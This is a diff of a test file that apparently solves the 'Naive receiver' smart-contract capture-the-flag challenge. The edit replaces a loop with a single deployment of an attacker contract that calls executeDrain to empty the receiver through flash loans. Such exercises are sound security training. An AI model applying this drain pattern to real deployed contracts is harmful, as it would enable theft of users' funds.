@@ -39,14 +39,10 @@ describe('[Challenge] Naive receiver', function () {
 		}
 		
 		// Solution 2 - Deploy custom contract to execute 10x flashloan from outside in one single TX
-		for (let i = 0; i < 10; i++) {
-			
-			const AttackerContractFactory = await ethers.getContractFactory('CustomContract', attacker);
-			this.attackerContract = await AttackerContractFactory.deploy(this.pool.address);
-			
-			await this.attackerContract.connect(attacker).executeDrain(this.receiver.address);
-			
-		}
+		const AttackerContractFactory = await ethers.getContractFactory('CustomContract', attacker);
+		this.attackerContract = await AttackerContractFactory.deploy(this.pool.address);
+		
+		await this.attackerContract.connect(attacker).executeDrain(this.receiver.address);
 		
     });
 
